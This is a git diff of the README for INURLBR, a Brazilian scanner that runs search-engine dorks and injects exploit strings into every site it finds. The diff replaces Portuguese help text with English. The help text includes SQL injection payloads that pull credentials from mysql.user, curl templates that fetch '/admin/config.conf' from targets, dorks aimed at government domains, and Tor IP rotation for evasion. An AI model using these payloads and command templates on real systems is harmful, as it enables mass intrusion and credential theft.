@@ -35,108 +35,141 @@ SCANNER - INURLBR
 - Opções:
 ------
 ```
- 
--h       Ajuda
---help   Ajuda
---ajuda  Ajuda
--q  Define motor de busca 1,2,3,4,5,6,7,8,9,10,11,12,13,all cada número é referente um motor.
-    [opções]:
-    1   - www.google.com.br
-    2   - www.bing.com
-    3   - br.search.yahoo.com
-    4   - www.ask.com
-    5   - search.hao123.com.br
-    6   - ajax.googleapis.com
-    7   - search.lycos.com
-    8   - busca.uol.com.br
-    9   - us.yhs4.search.yahoo.com
-    10  - pesquisa.sapo.pt
-    11  - www.dmoz.org
-    12  - www.gigablast.com
-    all - todos motores de busca
-    Default:    1
-    Exemplo: -q {op}
-    Uso:     -q 1
-             -q 5
-              Múltiplos motores  -q 1,2,5,6,11
-              Todos motores      -q all
+ _    _ ______ _      _____  
+| |  | |  ____| |    |  __ \
+| |__| | |__  | |    | |__) |
+|  __  |  __| | |    |  ___/
+| |  | | |____| |____| |    
+|_|  |_|______|______|_|                      
+-----------------------------------------------------------------------------------------------------
+-h
+--help   Alternative long length help command.
+--ajuda  Command to specify Help.
+ -q  Choose which search engine you want through [1...13]:
+     [options]:
+     1   - www.google.com.br
+     2   - www.bing.com
+     3   - br.search.yahoo.com
+     4   - www.ask.com
+     5   - search.hao123.com.br
+     6   - ajax.googleapis.com
+     7   - search.lycos.com
+     8   - busca.uol.com.br
+     9   - us.yhs4.search.yahoo.com
+     10  - pesquisa.sapo.pt
+     11  - www.dmoz.org
+     12  - www.gigablast.com
+     13  - web.search.naver.com
+     all - All search engines
+     Default:    1
+     Example: -q {op}
+     Usage:   -q 1
+              -q 5
+               Using more than one engine:  -q 1,2,5,6,11
+               Using all engines:      -q all
+     
+ -p  Choose which proxy you want to use through the search engine:
+     Example: -p {proxy:port}
+     Usage:   -p localhost:8118
+              -p socks5://googleinurl@localhost:9050
+              -p http://admin:12334@172.16.0.90:8080
    
--p  Define proxy para camuflagem envio de request para o motor de busca e para alvo-exploit.
-    Exemplo: -p {proxy:porta}
-    Uso:     -p localhost:8118
-             -p socks5://googleinurl@localhost:9050
-             -p http://admin:12334@172.16.0.90:8080
+--tor-random Enables the TOR function, each usage links an unique IP.
  
---tor-random habilita a função tor randômico, a cada execução do script o tor muda de ip.
+ -t  Choose the validation type: op 1, 2, 3
+     [options]:
+     1   - The first type uses default errors considering the script:
+     It establishes connection with the exploit through the get method.
+     demonstrativo: www.alvo.com.br/pasta/index.php?id={exploit}
+   
+     2   -  The second type tries to valid the error defined by: -a='ALGO_DENTRO_ALVO'
+     It also establishes connection with the exploit through the get method
+     demonstrativo: www.alvo.com.br/pasta/index.php?id={exploit}
+   
+     3   - The third type combine both first and second types:
+     Then, of course, it also establishes connection with the exploit through the get method
+     Demo: www.alvo.com.br{exploit}
+     Default:    1
+     Example: -t {op}
+     Usage:   -t 1
+     
+     DEFAULT ERRORS:  
+     CMS WORDPRESS, JDBC ERROR, MYSQL ERROR, MICROSOFT ERROR, ORACLE ERROR, POSTGRESQL ERROR,
+     ZEND FRAMEWORK ERROR, PHP ERROR, ASP ERROR, LUA ERROR, INDEFINITE ERROR
+   
+ --dork Defines which dork the search engine will use.
+     Example: --dork {dork}
+     Usage:   --dork 'site:.gov.br inurl:php? id'
+     - Using multiples dorks:
+     Example: --dork {[DORK]dork1[DORK]dork2[DORK]dork3}
+     Usage:   --dork '[DORK]site:br[DORK]site:ar inurl:php[DORK]site:il inurl:asp'
  
--t  Define que tipo de validação o script vai efetuar op 1,2,3
-    [opções]:
-    1   - Tipo 1 valida erros padrões do script
-    injeta & concatena exploit apartir do host & gets.
-    demonstrativo: www.alvo.com.br/pasta/index.php?id={exploit}
- 
-    2   -  Tipo 2 valida o erro definido na opção -a='ALGO_DENTRO_ALVO'
-    injeta & concatena exploit apartir do host & gets.
-    demonstrativo: www.alvo.com.br/pasta/index.php?id={exploit}
-   
-    3   - Tipo 3 valida erro definido na opção -a='ALGO_DENTRO_ALVO' & erros padrão script.
-    injeta & concatena exploit apartir do host.
-    demonstrativo: www.alvo.com.br{exploit}
-    Default:    1
-    Exemplo: -t {op}
-    Uso:     -t 1
-   
-    ERRO PADRÃO SCRIPT:  
-    ERRO MYSQL,ERRO MICROSOFT,ERRO ORACLE,ERRO POSTGRESQL,
-    ZEND FRAMEWORK,ERRO PHP,ERRO ASP,ERRO LUA,ERRO INDEFINIDOS
- 
---dork Define a dork que vai ser buscada nos motores.
-    Exemplo: --dork {dork}
-    Uso:     --dork 'site:.gov.br inurl:php? id'
-    - Usando múltiplas dorks.
-    Exemplo: --dork {[DORK]dork1[DORK]dork2[DORK]dork3}
-    Uso:     --dork '[DORK]site:br[DORK]site:ar inurl:php[DORK]site:il inurl:asp'
- 
---exploit-get  Define exploit via get será injetado a cada URL encontrada.
-    Exemplo: --exploit-get {exploit_get}
-    Uso:     --exploit-get '?´0x27;'
-   
---exploit-post Define exploit via post será injetado a cada URL encontrada.
-    Exemplo: --exploit-post {exploit_post}
-    Uso:     --exploit-post 'campo1=valor1&campo2=valor2&campo3=?´0x273exploit;&botao=ok'
-   
--a  Define procurar string que será procurada dentro de cada URL encontrada.
-    Exemplo: -a {string_procurada}
-    Uso:     -a '<title>ola mundo</title>'
-   
--d  Define o nível de debug na execução do script op 1,2,3,4,5,6
-    Exemplo: -d {op}
-    Uso:     -d 1 /URL motor de busca.
-             -d 2 /Mostra toda url executada.
-             -d 3 /Request detalhada de cada URL encontrada.
-             -d 4 /Mostra html de cada url executada.
-             -d 5 /Request detalhada de todas urls.
+ --exploit-get Defines which exploit will be injected through the GET method to each URL found.
+     Example: --exploit-get {exploit_get}
+     Usage:   --exploit-get '?´0x27;'
+     
+ --exploit-post Defines which exploit will be injected through the POST method to each URL found.
+     Example: --exploit-post {exploit_post}
+     Usage:   --exploit-post 'field1=valor1&field2=valor2&field3=?´0x273exploit;&botao=ok'
+     
+ --exploit-comand Defines which exploit/parameter will be executed in the options: --comand-vul/--comand-all.  
+     The exploit-comand will be identified by the paramaters: --comand-vul/--comand-all como _EXPLOIT_        
+     Ex --exploit-comand '/admin/config.conf' --comand-all 'curl -v _TARGET__EXPLOIT_'
+     _TARGET_ is the specified URL/TARGET obtained by the process
+     _EXPLOIT_ is the exploit/parameter defined by the option --exploit-comand.
+     Example: --exploit-comand {exploit-comand}
+     Usage:   --exploit-comand '/admin/config.conf'    
+     
+ -a  Specify the string that will be used on the search script:
+     Example: -a {string}
+     Usage:   -a '<title>hello world</title>'
+     
+ -d  Specify the script usage op 1, 2, 3, 4, 5, 6.
+     Example: -d {op}
+     Usage:     -d 1 /URL of the search engine.
+              -d 2 /Show all the url.
+              -d 3 /Detailed request of every URL.
+              -d 4 /Shows the HTML of every URL.
+              -d 5 /Detailed request of all URLs.
              
--s  Define arquivo de saida onde vai ser salvadas as URLS vulneráveis.
-    Exemplo: -s {arquivo}
-    Uso:     -s seu_arquivo.txt
-   
--o  Define arquivo que vai possibilitar execucação de testes com base em arquivo,
-    Sem motor de busca.
-    Exemplo: -o {arquivo_minhas_urls}
-    Uso:     -o testes.txt
+ -s  Specify the output file where it will be saved the vulnerable URLs.
+     
+     Example: -s {file}
+     Usage:   -s your_file.txt
+     
+ -o  Manually manage the vulnerable URLs you want to use from a file, without using a search engine.
+     Example: -o {file_where_my_urls_are}
+     Usage:   -o tests.txt
  
--m  Habilita buscar lista de emais dentro das urls encontrdas.  
+ -m  Enable the search for emails on the urls specified.
+       
+ -u  Enables the search for URL lists on the url specified.
  
---comand-vul Executa comandos no terminal para cada URL encontrada vulnerável.
-    Exemplo: --comand-vul {comando}
-    Uso:     --comand-vul 'nmap sV -p 22,80,21 _TARGET_'
-             --comand-vul './exploit.sh _TARGET_ output.txt'
+ --comand-vul Every vulnerable URL found will execute this command parameters.
+     Example: --comand-vul {command}
+     Usage:   --comand-vul 'nmap sV -p 22,80,21 _TARGET_'
+              --comand-vul './exploit.sh _TARGET_ output.txt'
              
---comand-all Executa comandos no terminal para todas URLS encontradas.
-    Exemplo: --comand-all {comando}
-    Uso:     --comand-all 'nmap sV -p 22,80,21 _TARGET_'
-             --comand-all './exploit.sh _TARGET_ output.txt'
+ --comand-all Use this commmand to specify a single command to EVERY URL found.
+     Example: --comand-all {command}
+     Usage:   --comand-all 'nmap sV -p 22,80,21 _TARGET_'
+              --comand-all './exploit.sh _TARGET_ output.txt'
+             
+    Observation:
+   
+    _TARGET_ will be replaced by the URL/target found, although if the user  
+    doesn't input the get, only the domain will be executed.
+   
+   _TARGETFULL_ will be replaced by the original URL / target found.
+   
+   _EXPLOIT_  will be replaced by the specified command argument --exploit-comand.
+   The exploit-comand will be identified by the parameters --comand-vul / --comand-all as _EXPLOIT_
+
+ --replace Replace values ​​in the target URL.
+    Example:  --replace {value_old[INURL]value_new}
+     Usage:   --replace 'index.php?id=[INURL]index.php?id=1666+and+(SELECT+user,Password+from+mysql.user+limit+0,1)=1'
+              --replace 'main.php?id=[INURL]main.php?id=1+and+substring(@@version,1,1)=1'
+              --replace 'index.aspx?id=[INURL]index.aspx?id=1%27´'
 ```
 
 - Dando permição para execução do script:
